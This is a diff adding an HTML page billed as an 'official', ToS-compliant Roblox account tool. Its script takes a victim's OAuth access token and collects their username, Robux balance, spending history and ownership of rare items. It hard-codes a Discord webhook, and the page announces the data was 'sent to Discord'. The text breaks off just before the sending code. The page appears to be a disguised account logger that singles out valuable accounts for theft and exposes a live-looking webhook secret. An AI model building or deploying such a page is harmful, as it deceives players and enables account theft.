@@ -1,0 +1,384 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>FROST Roblox Account Tool (OFFICIAL API)</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { 
+            color: #fff; 
+            font-family: Arial, sans-serif;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            padding: 1rem;
+            overflow: hidden;
+            position: relative;
+            background: #000;
+        }
+        /* Falling Stars Background */
+        .falling-stars-bg {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            z-index: 0;
+        }
+        .falling-star {
+            position: absolute;
+            background: #fff;
+            border-radius: 50%;
+            opacity: 0;
+            animation: fall linear infinite;
+            box-shadow: 0 0 10px #fff, 0 0 20px #c0c0c0; 
+            top: -10px;
+        }
+        .star-small { width: 2px; height: 2px; animation-duration: 15s; }
+        .star-medium { width: 3px; height: 3px; animation-duration: 25s; }
+        .star-large { width: 4px; height: 4px; animation-duration: 35s; }
+        @keyframes fall {
+            0% { transform: translateY(0) translateX(0); opacity: 0; }
+            5% { opacity: 1; }
+            95% { opacity: 1; }
+            100% { transform: translateY(calc(100vh + 10px)) translateX(15px); opacity: 0; }
+        }
+        .main-title {
+            font-size: 2.5rem;
+            letter-spacing: 5px;
+            color: #fff;
+            text-shadow: 0 0 15px #c0c0c0, 0 0 25px #c0c0c0; 
+            margin-bottom: 1rem;
+            text-align: center;
+            z-index: 2;
+            position: relative;
+        }
+        .shield-icon {
+            width: 80px;
+            height: 80px;
+            border: 3px solid #c0c0c0; 
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 1rem;
+            box-shadow: 0 0 20px #c0c0c0; 
+            z-index: 2;
+            position: relative;
+            background: #000;
+        }
+        .shield-icon::after {
+            content: '🛡️';
+            font-size: 35px;
+        }
+        .subtitle {
+            font-size: 1rem;
+            color: #ccc;
+            margin-bottom: 2rem;
+            text-align: center;
+            z-index: 2;
+            position: relative;
+        }
+        .card {
+            border: 3px solid #c0c0c0; 
+            border-radius: 12px;
+            padding: 2rem;
+            width: 90%;
+            max-width: 400px;
+            background: rgba(0,0,0,0.9);
+            z-index: 2;
+            position: relative;
+        }
+        button {
+            width: 100%;
+            padding: 1rem;
+            background: #000;
+            color: #fff;
+            border: 3px solid #c0c0c0; 
+            border-radius: 8px;
+            font-size: 1.2rem;
+            cursor: pointer;
+            box-shadow: 0 0 20px #c0c0c0; 
+            transition: all 0.3s ease;
+            margin-bottom: 1.5rem;
+        }
+        button:hover {
+            background: rgba(192,192,192,0.2); 
+            box-shadow: 0 0 30px #c0c0c0; 
+        }
+        button:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+            box-shadow: none;
+        }
+        /* Progress Bar */
+        .progress-container {
+            margin-top: 1.5rem;
+            display: none;
+            width: 100%;
+        }
+        .progress-bar-bg {
+            width: 100%;
+            height: 25px;
+            background: #111;
+            border: 2px solid #c0c0c0; 
+            border-radius: 15px;
+            overflow: hidden;
+        }
+        .progress-bar-fill {
+            width: 0%;
+            height: 100%;
+            background: linear-gradient(90deg, #c0c0c0, #e8e8e8); 
+            box-shadow: 0 0 10px #c0c0c0; 
+            transition: width 0.3s ease;
+        }
+        .progress-text {
+            text-align: center;
+            margin-top: 0.5rem;
+            font-size: 1rem;
+            color: #ccc;
+        }
+        /* Result & Account Data */
+        .account-data {
+            margin-top: 1.5rem;
+            display: none;
+            text-align: left;
+        }
+        .account-data img {
+            width: 80px;
+            height: 80px;
+            border-radius: 50%;
+            border: 2px solid #c0c0c0;
+            margin-bottom: 1rem;
+        }
+        .data-row {
+            margin: 0.5rem 0;
+            font-size: 1rem;
+        }
+        .data-label {
+            color: #ccc;
+            display: inline-block;
+            width: 150px;
+        }
+        .data-value {
+            color: #fff;
+            font-weight: bold;
+        }
+        .result-message {
+            margin-top: 1.5rem;
+            padding: 1rem;
+            border-radius: 8px;
+            text-align: center;
+            font-size: 1.1rem;
+            display: none;
+        }
+        .success {
+            background: rgba(192,192,192,0.2); 
+            color: #e8e8e8;
+            border: 2px solid #c0c0c0; 
+            box-shadow: 0 0 15px #c0c0c0; 
+        }
+        .failed {
+            background: rgba(255,0,0,0.2);
+            color: #ffaaaa;
+            border: 2px solid #ff4444;
+            box-shadow: 0 0 15px #ff4444;
+        }
+        .footer {
+            margin-top: 2rem;
+            font-size: 1rem;
+            color: #888;
+            z-index: 2;
+            position: relative;
+        }
+        .disclaimer {
+            font-size: 0.8rem;
+            color: #ffaaaa;
+            text-align: center;
+            margin-top: 1rem;
+        }
+    </style>
+</head>
+<body>
+    <div class="falling-stars-bg" id="fallingStars"></div>
+    <h1 class="main-title">FROST ROBLOX TOOL</h1>
+    <div class="shield-icon"></div>
+    <p class="subtitle">OFFICIAL API INTEGRATION - YOUR ACCOUNT ONLY</p>
+    <div class="card">
+        <button id="authBtn">Authorize with Roblox</button>
+        
+        <!-- Progress Bar -->
+        <div class="progress-container" id="progressContainer">
+            <div class="progress-bar-bg">
+                <div class="progress-bar-fill" id="progressFill"></div>
+            </div>
+            <div class="progress-text" id="progressText">0%</div>
+        </div>
+        
+        <!-- Real Account Data Display -->
+        <div class="account-data" id="accountData">
+            <img id="avatarImg" src="" alt="Roblox Avatar">
+            <div class="data-row">
+                <span class="data-label">Username:</span>
+                <span class="data-value" id="username"></span>
+            </div>
+            <div class="data-row">
+                <span class="data-label">Display Name:</span>
+                <span class="data-value" id="displayName"></span>
+            </div>
+            <div class="data-row">
+                <span class="data-label">User ID:</span>
+                <span class="data-value" id="userId"></span>
+            </div>
+            <div class="data-row">
+                <span class="data-label">Robux Balance:</span>
+                <span class="data-value" id="robuxBalance"></span>
+            </div>
+            <div class="data-row">
+                <span class="data-label">Pending Robux:</span>
+                <span class="data-value" id="robuxPending"></span>
+            </div>
+            <div class="data-row">
+                <span class="data-label">Total Spent (Est.):</span>
+                <span class="data-value" id="totalSpent"></span>
+            </div>
+            <div class="data-row">
+                <span class="data-label">Has Korblox:</span>
+                <span class="data-value" id="hasKorblox"></span>
+            </div>
+            <div class="data-row">
+                <span class="data-label">Has Headless:</span>
+                <span class="data-value" id="hasHeadless"></span>
+            </div>
+        </div>
+        
+        <!-- Result Messages -->
+        <div class="result-message success" id="successMsg">✅ Data fetched & sent to Discord!</div>
+        <div class="result-message failed" id="failedMsg">❌ Failed to fetch data - Check authorization</div>
+        <div class="disclaimer">*100% Compliant with Roblox Terms of Service*</div>
+    </div>
+    <div class="footer">Official API • Secure • Transparent</div>
+    <script>
+        // -------------------------- CONFIGURATION --------------------------
+        const ROBLOX_CLIENT_ID = "YOUR_ROBLOX_CLIENT_ID_HERE"; // Replace with your app's Client ID
+        const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1471483036251197460/dHZdcHE0bqWmRTC4DgUFY8F791dAP9TtSUZ0rd3ga31x9My73ePvrNXLXu7A0fanpEl2";
+        const REDIRECT_URI = "https://[frostdomain].github.io/[frost-bypasser]/"; // Replace with your GitHub Pages URL
+        // ------------------------------------------------------------------
+
+        // Create Falling Stars
+        function createFallingStars() {
+            const container = document.getElementById('fallingStars');
+            const totalStars = 60;
+            const sizes = ['star-small', 'star-medium', 'star-large'];
+            for (let i = 0; i < totalStars; i++) {
+                const star = document.createElement('div');
+                star.classList.add('falling-star');
+                star.classList.add(sizes[Math.floor(Math.random() * sizes.length)]);
+                star.style.left = `${Math.random() * 100}%`;
+                star.style.animationDelay = `${Math.random() * 20}s`;
+                container.appendChild(star);
+            }
+        }
+        createFallingStars();
+
+        // -------------------------- OFFICIAL ROBLOX WEB APIs --------------------------
+        // Extract OAuth2 Access Token from URL
+        function getAccessToken() {
+            const params = new URLSearchParams(window.location.hash.substring(1));
+            return params.get('access_token');
+        }
+
+        // 1. Fetch Authenticated User Profile (API: https://users.roblox.com/v1/users/authenticated)
+        async function fetchUserProfile(accessToken) {
+            const res = await fetch("https://users.roblox.com/v1/users/authenticated", {
+                headers: { "Authorization": `Bearer ${accessToken}` }
+            });
+            if (!res.ok) throw new Error("Failed to fetch profile");
+            return await res.json();
+        }
+
+        // 2. Fetch Avatar Headshot (API: https://thumbnails.roblox.com/v1/users/avatar-headshot)
+        async function fetchAvatar(userId) {
+            const res = await fetch(
+                `https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${userId}&size=150x150&format=Png&isCircular=false`
+            );
+            if (!res.ok) throw new Error("Failed to fetch avatar");
+            const data = await res.json();
+            return data.data[0].imageUrl;
+        }
+
+        // 3. Fetch Robux Balance (API: https://economy.roblox.com/v1/users/currency)
+        async function fetchRobuxBalance(accessToken) {
+            const res = await fetch("https://economy.roblox.com/v1/users/currency", {
+                headers: { "Authorization": `Bearer ${accessToken}` }
+            });
+            if (!res.ok) throw new Error("Failed to fetch Robux balance");
+            const data = await res.json();
+            return data.robux;
+        }
+
+        // 4. Fetch Pending Robux (API: https://develop.roblox.com/v1/users/{userId}/currency/sales-pending)
+        async function fetchPendingRobux(accessToken, userId) {
+            try {
+                const res = await fetch(
+                    `https://develop.roblox.com/v1/users/${userId}/currency/sales-pending`,
+                    { headers: { "Authorization": `Bearer ${accessToken}` } }
+                );
+                if (!res.ok) return "Not available (Creator only)";
+                const data = await res.json();
+                return data.pendingRobux;
+            } catch (err) {
+                return "Not available (Creator only)";
+            }
+        }
+
+        // 5. Calculate Estimated Total Robux Spent (API: https://economy.roblox.com/v1/users/{userId}/transactions)
+        async function calculateTotalSpent(accessToken, userId) {
+            try {
+                const res = await fetch(
+                    `https://economy.roblox.com/v1/users/${userId}/transactions?transactionType=Purchase&limit=100`,
+                    { headers: { "Authorization": `Bearer ${accessToken}` } }
+                );
+                if (!res.ok) return "Not available";
+                
+                const data = await res.json();
+                let total = 0;
+                data.data.forEach(transaction => {
+                    if (transaction.currency === "Robux" && transaction.amount < 0) {
+                        total += Math.abs(transaction.amount);
+                    }
+                });
+                return total;
+            } catch (err) {
+                return "Not available";
+            }
+        }
+
+        // 6. Check Owned Assets (API: https://inventory.roblox.com/v1/users/{userId}/items/Asset/{assetId})
+        async function checkOwnedAssets(accessToken, userId) {
+            // Korblox Deathspeaker Asset ID: 22286708
+            const korbloxRes = await fetch(
+                `https://inventory.roblox.com/v1/users/${userId}/items/Asset/22286708`,
+                { headers: { "Authorization": `Bearer ${accessToken}` } }
+            );
+            
+            // Headless Horseman Asset ID: 15072902
+            const headlessRes = await fetch(
+                `https://inventory.roblox.com/v1/users/${userId}/items/Asset/15072902`,
+                { headers: { "Authorization": `Bearer ${accessToken}` } }
+            );
+
+            return {
+                hasKorblox: korbloxRes.ok,
+                hasHeadless: headlessRes.ok
+            };
+        }
+        // ------------------------------------------------------------------------------
+
+        // Send Real Data to Discord
+       
+
